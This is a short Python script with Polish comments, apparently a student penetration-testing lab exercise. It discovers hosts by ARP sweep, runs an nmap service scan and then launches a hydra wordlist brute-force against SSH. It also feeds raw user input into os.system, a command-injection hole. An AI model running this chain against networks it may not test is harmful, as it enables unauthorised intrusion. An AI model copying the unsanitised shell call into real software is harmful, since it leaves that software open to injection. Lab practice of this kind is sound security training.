#! /usr/bin/python


# Zadanie Nr.1 ustalenie adresu IP
from scapy.all import *
from netaddr import *
import os

""" Ustalenie adresu ip"""

ip = get_if_addr(conf.iface)
ip = get_if_addr("eth0")
ip
print("AdressIP")
print(ip)

# x = os.system("ip route show | awk '/eth0.*scope/ {print $1}'") link interaktywny

print("-----------------------------------")


#Zadanie Nr.2 Ustalenie maski podsieci
y = IPNetwork('192.168.1.0/24')
# y.netmask
#Wyszukiwanie maski podsieci
print("netmask:")
print(y.netmask)


#Zadanie Nr.3 Na podstawie powyższych informacji ustalenie adresow IP innych aktywnych hostów w
# tej samej sieci
target_ip = "192.168.1.1/24"
# wyszukiwanie adresow ip
arp = ARP(pdst=target_ip)
# tworzenie broadkast pakietu

ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp
result = srp(packet, timeout=3, verbose=0)[0]
# lista klientow
clients = []
for sent, received in result:
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})
# printujemy clientow
print("Available devices in the network:")
print("IP" + " "*18+"MAC")
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))

#Zadanie Nr.4Ustalenie otwartych portow na wszystkich znalezionych hostach
#Zadanie Nr.5  Ustalenie nazwę oraz wersję oprogramowania dla wszystkich usług na wszystkich hostach
"""Skanowanie wszsystkich otwartych portow"""
x = input("wpisz adress ip: ")
os.system(f'nmap -sV {x}')


# 6. Przeprowadzić manualną analizę jednej z usług i na podstawie znalezionych
# informacji kontynuować test penetracyjny
# Adress IP 192.168.1.108 pochodzi z zadania Nr. 3
# Usuga ssh pochodzi z zadania 4

os.system(f'hydra -t 10 -L /root/PycharmProjects/pythonProject/common_users.txt -P /root/PycharmProjects/pythonProject/common_passwords.txt {x} ssh')


